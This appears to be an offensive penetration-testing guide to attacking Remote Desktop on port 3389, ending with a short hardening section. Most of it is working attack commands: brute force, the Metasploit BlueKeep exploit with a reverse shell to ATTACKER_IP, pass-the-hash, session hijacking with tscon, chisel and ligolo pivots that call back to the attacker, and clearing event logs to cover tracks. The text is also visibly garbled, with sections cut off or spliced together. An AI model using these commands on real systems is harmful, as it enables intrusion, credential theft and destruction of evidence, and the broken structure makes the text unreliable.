## Overview

::callout
---
icon: i-lucide-info
color: info
---
**Port 3389** runs **Remote Desktop Protocol (RDP)**, Microsoft's proprietary protocol for remote graphical access to Windows systems. RDP is one of the **most attacked services on the internet** — it provides full GUI access to a system, making it an extremely high-value target. Compromising RDP means **complete interactive control** of the target machine with keyboard, mouse, clipboard, file transfer, and audio redirection.
::

| Property | Detail |
| -------------- | -------------------------------------------------- |
| `Port` | `3389/TCP (default), 3389/UDP (UDP transport)` |
| `Protocol` | `RDP (Remote Desktop Protocol)` |
| `Service` | `ms-wbt-server (Microsoft Windows Based Terminal)` |
| `Layer` | `Application Layer (OSI Layer 7)` |
| `Encryption` | `TLS/SSL, CredSSP, NLA (Network Level Authentication)` |
| `OS Target` | `Windows (Primary), Linux (xrdp, FreeRDP server)` |
| `Risk Level` | `🔴 Critical` |
| `Default State` | `Disabled on Workstations, Enabled on Servers (varies)` |
| `Auth Methods` | `NLA (CredSSP/NTLM/Kerberos), TLS, RDP Security Layer` |
| `Common Software` | `Windows Remote Desktop Services, xrdp, FreeRDP` |

### How RDP Works — Protocol Flow

::note
Understanding the RDP connection flow is **critical** for identifying attack points at each stage: network discovery, certificate validation, authentication, and channel establishment.
::

```text [RDP Connection Flow]
Client                                        Server
  |                                             |
  |  1. TCP SYN → Port 3389                    |
  | ------------------------------------------→ |
  |                                             |
  |  2. X.224 Connection Request               |
  |  (Requested protocols: NLA, TLS, RDP)      |
  | ------------------------------------------→ |
  |                                             |
  |  3. X.224 Connection Confirm               |
  |  (Selected protocol: NLA/TLS/RDP)          |
  | ←------------------------------------------ |
  |                                             |
  |  4. TLS Handshake (if TLS/NLA)             |
  |  (Server certificate presented)            |
  | ←-----------------------------------------→ |   ← 🟠 Certificate validation
  |                                             |
  |  5. CredSSP / NLA Authentication           |
  |  (NTLM or Kerberos via CredSSP)            |
  | ------------------------------------------→ |   ← 🔴 Credential transmission
  |                                             |
  |  6. MCS Connect / Channel Join             |
  |  (Virtual channels established)            |
  | ←-----------------------------------------→ |
  |                                             |
  |  7. Security Exchange (Encryption keys)    |
  | ←-----------------------------------------→ |
  |                                             |
  |  8. Client Info (Username, Domain, etc.)   |
  | ------------------------------------------→ |
  |                                             |
  |  9. License Negotiation                    |
  | ←-----------------------------------------→ |
  |                                             |
  | 10. Capabilities Exchange                  |
  | ←-----------------------------------------→ |
  |                                             |
  | 11. Desktop / Graphical Output             |
  | ←-----------------------------------------→ |   ← Full interactive session
  |                                             |
```

### RDP Security Layers

::accordion

  :::accordion-item
  ---
  icon: i-lucide-shield
  label: "Security Layer Comparison"
  ---

  | Security Layer | Description | Encryption | NLA | Risk |
  | -------------- | ----------- | ---------- | --- | ---- |
  | `RDP Security Layer` | Legacy — uses RC4 encryption built into RDP | 🔴 Weak RC4 | ❌ No | 🔴 MitM possible, credential theft |
  | `TLS (SSL)` | Standard TLS encryption wrapping RDP | 🟢 TLS 1.0-1.3 | ❌ No | 🟠 No pre-auth, resource exhaustion |
  | `NLA (CredSSP)` | Network Level Authentication — authenticates BEFORE session | 🟢 TLS + CredSSP | ✅ Yes | 🟢 Best — prevents unauthenticated access |
  | `NLA + TLS` | NLA with TLS transport | 🟢 TLS + CredSSP | ✅ Yes | 🟢 Recommended configuration |

  **Key Differences:**

  - **Without NLA:** Server allocates resources and shows login screen before authentication → vulnerable to DoS and MitM
  - **With NLA:** Client must authenticate via CredSSP before any RDP session is created → prevents unauthenticated access
  - **CredSSP uses:** NTLM or Kerberos for authentication, wrapped in TLS

  :::

  :::accordion-item
  ---
  icon: i-lucide-key
  label: "Authentication Mechanisms"
  ---

  | Method | How It Works | Attack Surface |
  | ------ | ------------ | -------------- |
  | `NTLM` | Challenge-response via CredSSP | Pass-the-Hash, relay, brute force |
  | `Kerberos` | Ticket-based via CredSSP (domain) | Pass-the-Ticket, overpass-the-hash |
  | `Smart Card` | Certificate-based authentication | Certificate theft |
  | `Windows Hello` | Biometric/PIN via FIDO2 | Limited attack surface |
  | `Remote Credential Guard` | Kerberos without sending creds to server | Very secure — creds never leave client |
  | `Restricted Admin` | Pass-the-Hash friendly — no creds sent to server | 🔴 Enables PtH RDP! |

  :::

  :::accordion-item
  ---
  icon: i-lucide-monitor
  label: "RDP Virtual Channels"
  ---

  RDP uses virtual channels for different data streams:

  | Channel | Purpose | Attack Potential |
  | ------- | ------- | ---------------- |
  | `RDPDR` | Device redirection (drives, printers, USB) | Data exfiltration, malware deployment |
  | `CLIPRDR` | Clipboard redirection | Clipboard data theft |
  | `RDPSND` | Audio redirection | Eavesdropping |
  | `DRDYNVC` | Dynamic virtual channels | Various |
  | `RAIL` | RemoteApp (single app mode) | Application-level attacks |
  | `Graphics` | Display rendering (RFX, GFX) | Visual data capture |

  :::

### NLA (Network Level Authentication) Detection

::warning
**NLA status determines your attack approach.** Without NLA, you can connect to the login screen without credentials. With NLA, you need valid credentials before the session starts.
::

```bash [Terminal]
# Nmap NLA detection
nmap -p 3389 --script rdp-enum-encryption <TARGET_IP>

# CrackMapExec NLA check
crackmapexec rdp <TARGET_IP>
# SMB  10.10.10.40  3389  WS01  [*] Windows 10 Build 19041 (name:WS01) (domain:CORP) (nla:True)
#                                                                                      ^^^^^^^^

# Manual check with Python
python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect(('<TARGET_IP>', 3389))
# Send X.224 Connection Request with NLA
# If server responds with PROTOCOL_HYBRID (NLA) → NLA enabled
data = s.recv(1024)
print(data.hex())
s.close()
"

# rdp-sec-check — dedicated NLA checker
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git
perl rdp-sec-check.pl <TARGET_IP>
```

**NLA Detection Results:**

| Result | Meaning | Attack Impact |
| ------ | ------- | ------------- |
| `NLA: True / CredSSP: SUCCESS` | NLA enabled | Must have valid creds to connect |
| `NLA: False / Native RDP: SUCCESS` | NLA disabled | 🔴 Can reach login screen without creds |
| `SSL only: SUCCESS` | TLS but no NLA | 🟠 Can reach login screen, encrypted channel |
| `RDP Security: SUCCESS` | Legacy security | 🔴 RC4 only, MitM possible |

### SSL/TLS Certificate Analysis

```bash [Terminal]
# Extract RDP certificate information
openssl s_client -connect <TARGET_IP>:3389 </dev/null 2>/dev/null | openssl x509 -noout -text

# Quick certificate info
openssl s_client -connect <TARGET_IP>:3389 </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -dates -fingerprint

# Check for weak ciphers
sslscan <TARGET_IP>:3389
sslyze --regular <TARGET_IP>:3389

# Check for self-signed cert (common — MitM possible)
openssl s_client -connect <TARGET_IP>:3389 </dev/null 2>/dev/null | grep -i "self-signed\|verify error"
```

**Certificate Intel:**

### User Enumeration

::steps{level="4"}

#### RDP User Enumeration via Timing

::note
Some Windows configurations respond differently (timing) for valid vs invalid usernames during NLA authentication.
::

```bash [Terminal]
# CrackMapExec user enumeration
crackmapexec rdp <TARGET_IP> -u users.txt -p 'FakePassword123!' --continue-on-success
# Valid users may show different error messages

# Timing-based enumeration
#!/bin/bash
TARGET=$1
while read user; do
  START=$(date +%s%N)
  xfreerdp /v:$TARGET /u:$user /p:'WrongPass!' /cert:ignore /auth-only +auth-only 2>/dev/null
  END=$(date +%s%N)
  ELAPSED=$(( ($END - $START) / 1000000 ))
  echo "$user: ${ELAPSED}ms"
done < users.txt
# Valid users often have different response times
```

## Weak Points & Misconfigurations

::tip
These are the **most common weak points** attackers exploit against RDP services during real-world engagements and red team operations.
::

::card-group

  ::card
  ---
  title: "RDP Exposed to Internet"
  icon: i-lucide-globe
  color: red
  ---
  RDP directly accessible from the internet without VPN or gateway. The **#1 ransomware entry vector**.

  **Check:** `shodan search "port:3389"`

  **Impact:** Brute force, vulnerability exploitation, ransomware deployment
  ::

  ::card
  ---
  title: "NLA Disabled"
  icon: i-lucide-unlock
  color: red
  ---
  Network Level Authentication disabled — allows unauthenticated connection to login screen.

  **Check:** `nmap --script rdp-enum-encryption <IP>`

  **Impact:** DoS attacks, MitM credential theft, pre-auth exploit delivery
  ::

  ::card
  ---
  title: "Weak/Default Credentials"
  icon: i-lucide-key
  color: red
  ---
  Default, blank, or easily guessable passwords for RDP accounts.

  **Check:** `crowbar -b rdp -s <IP>/32 -u admin -C pass.txt`

  **Impact:** Full interactive system access
  ::

  ::card
  ---
  title: "No Account Lockout"
  icon: i-lucide-repeat
  color: red
  ---
  Missing lockout policy allows unlimited brute force attempts against RDP.

  **Impact:** Unlimited credential guessing
  ::

  ::card
  ---
  title: "Self-Signed Certificate"
  icon: i-lucide-shield-off
  color: red
  ---
  Self-signed RDP certificate — users trained to click "Yes" on certificate warnings, enabling MitM.

  **Check:** `openssl s_client -connect <IP>:3389`

  **Impact:** Credential interception via MitM
  ::

  ::card
  ---
  title: "RDP Security Layer (No TLS)"
  icon: i-lucide-lock-open
  color: red
  ---
  Legacy RDP Security Layer uses weak RC4 encryption instead of TLS.

  **Check:** `rdp-sec-check.pl <IP>`

  **Impact:** MitM credential theft, session hijacking
  ::

  ::card
  ---
  title: "Restricted Admin Mode Enabled"
  icon: i-lucide-shield-question
  color: red
  ---
  Restricted Admin allows **Pass-the-Hash** RDP login without knowing the plaintext password.

  **Check:** Test RDP with NTLM hash

  **Impact:** Lateral movement using only password hashes
  ::

  ::card
  ---
  title: "BlueKeep Vulnerable (Unpatched)"
  icon: i-lucide-bug
  color: red
  ---
  Windows 7/2008 R2 and older systems vulnerable to CVE-2019-0708 — **unauthenticated RCE**.

  **Check:** `nmap --script rdp-vuln-0708 <IP>`

  **Impact:** Pre-auth SYSTEM shell, wormable
  ::

  ::card
  ---
  title: "Clipboard Sharing Enabled"
  icon: i-lucide-clipboard
  color: red
  ---
  Clipboard redirection allows data theft from RDP sessions.

  **Impact:** Credential/data theft from clipboard
  ::

  ::card
  ---
  title: "Drive Redirection Enabled"
  icon: i-lucide-hard-drive
  color: red
  ---
  Local drive mapping in RDP sessions exposes client filesystem to the server.

  **Impact:** Data exfiltration, malware deployment to client drives
  ::

  ::card
  ---
  title: "Multi-Session / Terminal Server"
  icon: i-lucide-users
  color: red
  ---
  Terminal Server allows multiple concurrent RDP sessions — more users to target.

  **Impact:** More attack surface, session hijacking
  ::

  ::card
  ---
  title: "CredSSP Vulnerability (CVE-2018-0886)"
  icon: i-lucide-shield-alert
  color: red
  ---
  CredSSP protocol flaw allows MitM to relay credentials during NLA.

  **Check:** Check Windows patch level

  **Impact:** Credential interception despite NLA
  ::

### Exploit Deep Dive

::accordion

  :::accordion-item
  ---
  icon: i-lucide-skull
  label: "CVE-2019-0708 — BlueKeep (Wormable RDP RCE)"
  ---

  **The most critical RDP vulnerability ever discovered.** Comparable to EternalBlue in impact. CVSS 9.8, **wormable**, pre-authentication remote code execution.

  **Affected:** Windows XP, Vista, 7, Server 2003, Server 2008, Server 2008 R2

  **How It Works — Technical Deep Dive:**
  1. Exploits a **use-after-free** vulnerability in the RDP protocol's handling of **internal virtual channels**
  2. The flaw is in `termdd.sys` driver's `IcaBindVirtualChannels()` and `IcaRebindVirtualChannels()` functions
  3. Attacker sends specially crafted RDP connection request referencing channel ID `MS_T120`
  4. MS_T120 is an internal-only channel — external binding creates a use-after-free condition
  5. Attacker controls freed memory → arbitrary kernel code execution
  6. Results in **NT AUTHORITY\SYSTEM** without any authentication
  7. **Wormable** — can propagate automatically like WannaCry

  ```text [Attack Flow]
  1. TCP Connect → Port 3389
  2. X.224 Connection Request (Cookie: mstshash)
  3. MCS Connect → GCC Create (bind MS_T120 channel)
  4. Channel Join → Trigger use-after-free
  5. Pool spray → Control freed object
  6. Kernel shellcode → SYSTEM shell
  ```

  **Detection:**
  ```bash [Terminal]
  # Nmap
  nmap -p 3389 --script rdp-vuln-0708 <TARGET_IP>

  # Metasploit scanner
  use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
  set RHOSTS <TARGET_IP>
  run

  # CrackMapExec
  crackmapexec rdp <TARGET_IP> -M bluekeep

  # Subnet scan
  nmap -p 3389 --script rdp-vuln-0708 <TARGET_RANGE>/24 -oA bluekeep_scan

  # rdpscan — fast BlueKeep scanner
  rdpscan <TARGET_RANGE>/24
  ```

  **Exploitation — Metasploit:**
  ```bash [Terminal]
  msfconsole

  use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
  set RHOSTS <TARGET_IP>
  set LHOST <ATTACKER_IP>
  set TARGET 1               # Target selection is CRITICAL

  # Target options:
  # 0 - Automatic (unreliable)
  # 1 - Windows 7 SP1 / 2008 R2 SP1 (VMware)
  # 2 - Windows 7 SP1 / 2008 R2 SP1 (Hyper-V)
  # 3 - Windows 7 SP1 / 2008 R2 SP1 (Physical/VirtualBox)
  # 4 - Windows 7 SP1 / 2008 R2 SP1 (Other)

  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  run
  ```

  ::caution
  **EXTREMELY UNRELIABLE** in practice. Incorrect target selection causes **BSOD (Blue Screen of Death)**. The kernel pool grooming requires precise timing. **Always test in lab first.** Expect ~30% success rate and high crash risk.
  ::

  **Exploitation — Manual PoC:**
  ```bash [Terminal]
  # Python PoC (research/detection only)
  git clone https://github.com/n1nj4sec/CVE-2019-0708.git
  python3 bluekeep.py <TARGET_IP>

  # Another scanner
  git clone https://github.com/Ekultek/BlueKeep.git
  python3 bluekeep_poc.py --target <TARGET_IP>
  ```

  **Post-Exploitation:**
  ```bash [Terminal]
  # If exploit succeeds — SYSTEM shell
  getuid
  # NT AUTHORITY\SYSTEM

  hashdump
  load kiwi
  creds_all
  ```

  label: "CVE-2019-1181 / CVE-2019-1182 — DejaBlue"
  ---

  **BlueKeep's sequel — affects MODERN Windows.** Pre-auth RCE in RDP on Windows 10 and Server 2019.

  **Affected:** Windows 7 SP1, 8.1, 10 (all versions), Server 2008 R2 SP1, 2012, 2012 R2, 2016, 2019

  **How It Works:**
  - Use-after-free in RDP's **decompression component**
  - Triggered during pre-authentication phase
  - Similar to BlueKeep but in a different code path
  - Affects a much wider range of Windows versions (including Windows 10)
  - **Wormable** — no user interaction required

  **Detection:**
  ```bash [Terminal]
  # Check Windows version
  nmap -p 3389 --script rdp-ntlm-info <TARGET_IP>
  # Product_Version: 10.0.17763 → Server 2019 (vulnerable if unpatched)

  # Check patch level (requires credentials)
  crackmapexec smb <TARGET_IP> -u 'admin' -p 'pass' -x 'wmic qfe list brief' | grep KB4512506
  # KB4512506 = August 2019 patch (fixes DejaBlue)
  ```

  ::warning
  No reliable public exploit exists yet. Microsoft patched this before weaponized exploits were published. However, **nation-state actors likely have working exploits**.

  **Bypass Windows lock screen after NLA-authenticated RDP session.**

  6. An attacker who captures the NLA credentials can bypass the lock screen

### Phase 1 — Discovery & Fingerprinting

```bash [Terminal]
# Quick discovery
nmap -sV -sC -p 3389 <TARGET_IP> -oA initial_rdp

# Full fingerprint
nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info <TARGET_IP>

# CrackMapExec fingerprint
crackmapexec rdp <TARGET_IP>
nxc rdp <TARGET_IP>

# SSL certificate check
openssl s_client -connect <TARGET_IP>:3389 </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer

# RDP security assessment
perl rdp-sec-check.pl <TARGET_IP>:3389
```

**Decision Matrix:**

| Finding | Next Step |
| ------- | --------- |
| Windows XP / 7 / 2008 R2 | → BlueKeep scan immediately |
| Windows 10 / 2019 (pre-Aug 2019) | → DejaBlue check |
| NLA disabled | → Screenshot, pre-auth attacks, login screen access |
| NLA enabled | → Credential attacks, MitM |
| Self-signed certificate | → MitM with Seth/PyRDP |
| RDP Security Layer accepted | → Downgrade + MitM |
| RD Gateway (port 443) | → CVE-2020-0609/0610 |
| RD Licensing service | → CVE-2024-38077 |
| Restricted Admin enabled | → Pass-the-Hash via RDP |

### Phase 4 — Pass-the-Hash via RDP

::warning
**Pass-the-Hash via RDP** requires **Restricted Admin mode** to be enabled on the target. This is a powerful lateral movement technique.
::

```bash [Terminal]
# ============================================
# CHECK IF RESTRICTED ADMIN IS ENABLED
# ============================================

# Method 1: Try connecting with hash
xfreerdp /v:<TARGET_IP> /u:administrator /pth:<NTLM_HASH> /cert:ignore

# Method 2: Check registry (requires SMB admin)
crackmapexec smb <TARGET_IP> -u 'admin' -p 'pass' -x 'reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin'
# Value: 0x0 = Restricted Admin ENABLED (PtH possible)
# Value: 0x1 = Restricted Admin DISABLED
# Key not found = DISABLED by default

# ============================================
# ENABLE RESTRICTED ADMIN (If you have admin access)
# ============================================
crackmapexec smb <TARGET_IP> -u 'admin' -p 'pass' -x 'reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f'

# ============================================
# PASS-THE-HASH RDP LOGIN
# ============================================

# xfreerdp — PtH
xfreerdp /v:<TARGET_IP> /u:administrator /pth:<NTLM_HASH> /cert:ignore /dynamic-resolution

# With domain
xfreerdp /v:<TARGET_IP> /u:admin /d:corp.local /pth:<NTLM_HASH> /cert:ignore

# Mimikatz — PtH + RDP
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NTLM_HASH> /run:"mstsc.exe /v:<TARGET_IP> /restrictedadmin"

# SharpRDP — command execution via RDP (C#)
SharpRDP.exe computername=<TARGET_IP> command="cmd.exe /c whoami > C:\temp\out.txt" username=administrator password=<NTLM_HASH> pth
```

**Restricted Admin Mode Explained:**

```text [Restricted Admin Flow]
Normal RDP:
  Client sends credentials → Server has creds in memory → Credential theft possible

Restricted Admin RDP:
  Client sends NTLM hash → Server authenticates via NLA → No creds stored on server
  ↓
  BUT: Only needs HASH = Pass-the-Hash works!
  AND: No creds on server = Can't access network resources from RDP session
```

| Mode | Creds on Server | Network Access | PtH Possible |
| ---- | --------------- | -------------- | ------------ |
| Normal RDP | ✅ Yes (in LSASS) | ✅ Yes | ❌ No (need plaintext) |
| Restricted Admin | ❌ No | ❌ Limited | ✅ Yes! |
| Remote Credential Guard | ❌ No | ✅ Yes (via Kerberos) | ❌ No |

## Session Hijacking

::caution
**RDP Session Hijacking** allows you to take over another user's active RDP session — including **administrators** — without knowing their password. This is one of the most powerful post-exploitation techniques.

### Session Hijacking via tscon (SYSTEM Required)

::warning
**Requires SYSTEM-level access.** If you have SYSTEM, you can hijack ANY RDP session — active, disconnected, or locked — without credentials.
::

::steps{level="4"}

#### List Available Sessions

```bash [Terminal]
# List all sessions
qwinsta
query session
query user

# Expected output:
#  SESSIONNAME       USERNAME           ID  STATE   TYPE
#  services                              0  Disc
#  console           admin               1  Active
#  rdp-tcp#1         jsmith              2  Active   ← Target!
#  rdp-tcp#3         ceo                 3  Disc     ← Disconnected session!
#  rdp-tcp                           65536  Listen
```

#### Get SYSTEM Access

```bash [Terminal]

PsExec64.exe -s -i cmd.exe

# Method 2: Service creation
sc create hijack binPath= "cmd.exe /k tscon 2 /dest:rdp-tcp#0" type= own start= demand
sc start hijack

# Method 3: Scheduled task
schtasks /create /tn "SessionHijack" /tr "tscon 2 /dest:console" /sc once /st 00:00 /ru SYSTEM
schtasks /run /tn "SessionHijack"

# Method 4: Mimikatz token escalation
privilege::debug
token::elevate
```

#### Hijack the Session

```bash [Terminal]

tscon 2 /dest:console

# Or to your RDP session
tscon 2 /dest:rdp-tcp#0

# If session is disconnected (no dest needed):
tscon 3

# With password (if you know it)
tscon 2 /dest:console /password:P@ssw0rd

# ============================================
# FROM NON-INTERACTIVE (service/task)
# ============================================

net start sesshijack

# Scheduled task method

schtasks /run /tn "rdphijack"
schtasks /delete /tn "rdphijack" /f
```

### RDP Pivoting / Multi-Hop

```bash [Terminal]

# ============================================

# (Inside RDP session, open mstsc.exe → connect to next host)

# SSH TUNNEL → RDP
# ============================================

# Then connect

# ============================================

ssh -D 1080 user@<PIVOT_HOST>

# Connect via proxychains
proxychains xfreerdp /v:<INTERNAL_TARGET> /u:admin /p:'pass' /cert:ignore

# ============================================
# CHISEL TUNNEL → RDP
# ============================================

# On attacker (server)
chisel server --reverse --port 8080

# On compromised host (client)
chisel client <ATTACKER_IP>:8080 R:13389:<INTERNAL_TARGET>:3389

# Connect to forwarded port
xfreerdp /v:127.0.0.1:13389 /u:admin /p:'pass' /cert:ignore

# ============================================
# METASPLOIT → RDP PORT FORWARD
# ============================================

# In meterpreter
portfwd add -l 13389 -p 3389 -r <INTERNAL_TARGET>

# Then from attacker
xfreerdp /v:127.0.0.1:13389 /u:admin /p:'pass' /cert:ignore

# ============================================
# LIGOLO-NG → RDP
# ============================================

# On attacker
ligolo-proxy -selfcert

# On compromised host
ligolo-agent -connect <ATTACKER_IP>:11601 -ignore-cert

# In ligolo interface
>> session
>> ifconfig
>> start
>> listener_add --addr 0.0.0.0:13389 --to <INTERNAL_TARGET>:3389

# Connect
xfreerdp /v:127.0.0.1:13389 /u:admin /p:'pass' /cert:ignore
```

```bash [Terminal]
# Or use /admin flag for admin session (server)
xfreerdp /v:<TARGET_IP> /u:admin /p:'pass' /cert:ignore /admin

# Shadow existing session instead of new one
mstsc /shadow:<SESSION_ID> /noConsentPrompt /control

# ============================================
# MINIMIZE RDP LOGS
# ============================================

# Use Restricted Admin mode (fewer credential artifacts)
xfreerdp /v:<TARGET_IP> /u:admin /pth:<HASH> /cert:ignore

# Use Remote Credential Guard (no creds on target at all)
mstsc /v:<TARGET_IP> /remoteguard

# Disable RDP event logging (post-compromise)
wevtutil sl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" /e:false
wevtutil sl "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational" /e:false

# Clear RDP logs
wevtutil cl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"
wevtutil cl "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational"
wevtutil cl Security
wevtutil cl System

# ============================================
# TIMESTAMPS — COVER TRACKS
# ============================================

# Delete recent RDP connection history
reg delete "HKCU\Software\Microsoft\Terminal Server Client" /f
reg delete "HKCU\Software\Microsoft\Terminal Server Client\Default" /f
reg delete "HKCU\Software\Microsoft\Terminal Server Client\Servers" /f

# Delete cached RDP credentials
cmdkey /delete:<TARGET_IP>

# Delete .rdp files
del /q %USERPROFILE%\Documents\*.rdp
del /q %APPDATA%\Microsoft\Windows\Recent\*.rdp

# ============================================
# USE NON-STANDARD PORT
# ============================================

# Change RDP to non-standard port (post-compromise)
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f
# Restart service — RDP now on port 443 (blends with HTTPS traffic)
```

## RDP over Non-Standard Ports

::note
Many organizations change the RDP port from 3389 to avoid automated scanning. Here's how to discover and enumerate non-standard RDP.
::

```bash [Terminal]
# ============================================
# DISCOVER NON-STANDARD RDP PORTS
# ============================================

# Full port scan with service detection
nmap -sV -p- --open <TARGET_IP> | grep -i "ms-wbt-server\|rdp\|remote desktop"

# Common alternate RDP ports
nmap -sV -p 3389,3390,3391,3392,3393,8080,443,13389,23389,33389 <TARGET_IP>

# Shodan search for non-standard ports
shodan search "product:Remote Desktop port:!3389"

# Check registry for configured port (if you have access)
reg query "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber

# ============================================
# CONNECT TO NON-STANDARD PORT
# ============================================
xfreerdp /v:<TARGET_IP>:13389 /u:admin /p:'pass' /cert:ignore
rdesktop <TARGET_IP>:13389
mstsc /v:<TARGET_IP>:13389
```

## Remediation & Hardening Guide

::tip
For **blue teamers and system administrators** — implement these controls to protect RDP services.
::

### Critical Remediations

::steps{level="4"}

#### Never Expose RDP to Internet

```bash [Terminal]
# Use VPN or RD Gateway instead of direct exposure
# Block port 3389 at perimeter firewall

# Windows Firewall — restrict to specific IPs
netsh advfirewall firewall set rule name="Remote Desktop - User Mode (TCP-In)" new remoteip=10.10.10.0/24
netsh advfirewall firewall set rule name="Remote Desktop - User Mode (UDP-In)" new remoteip=10.10.10.0/24
```

#### Enable NLA (Network Level Authentication)

```powershell [Terminal]
# Registry
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name UserAuthentication -Value 1

# Group Policy
# Computer Configuration → Administrative Templates → Windows Components
# → Remote Desktop Services → Remote Desktop Session Host → Security
# → "Require user authentication for remote connections by using NLA": Enabled
```

#### Deploy Proper SSL Certificates

```powershell [Terminal]
# Replace self-signed certificate with CA-issued certificate
# Via Group Policy:
# Computer Configuration → Administrative Templates → Windows Components
# → Remote Desktop Services → Remote Desktop Session Host → Security
# → "Server authentication certificate template": Select proper template

# Or via PowerShell
$cert = Get-ChildItem -Path Cert:\LocalMachine\My | Where-Object {$_.Subject -eq "CN=rdp.corp.local"}
wmic /namespace:\\root\cimv2\TerminalServices PATH Win32_TSGeneralSetting Set SSLCertificateSHA1Hash="$($cert.Thumbprint)"
```

#### Disable Restricted Admin (Prevent PtH)

```powershell [Terminal]
# Disable Restricted Admin mode
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 1

# Or via Group Policy
# Computer Configuration → Administrative Templates → System → Credentials Delegation
# → "Restrict delegation of credentials to remote servers": Enabled
```

#### Implement Account Lockout

```powershell [Terminal]
# Group Policy
# Computer Configuration → Windows Settings → Security Settings → Account Policies → Account Lockout Policy
# → Account lockout threshold: 5 attempts
# → Account lockout duration: 30 minutes
# → Reset account lockout counter after: 30 minutes
```

#### Patch Systems

```powershell [Terminal]
# Critical RDP patches:
# KB4499175 — CVE-2019-0708 (BlueKeep)
# KB4512506 — CVE-2019-1181/1182 (DejaBlue)
# KB4103718 — CVE-2018-0886 (CredSSP)
# KB2621440 — MS12-020 (RDP DoS/RCE)

Get-HotFix | Where-Object {$_.HotFixID -match "KB4499175|KB4512506|KB4103718|KB2621440"}

# Install missing patches
Install-Module PSWindowsUpdate
Get-WindowsUpdate
Install-WindowsUpdate -AcceptAll
```
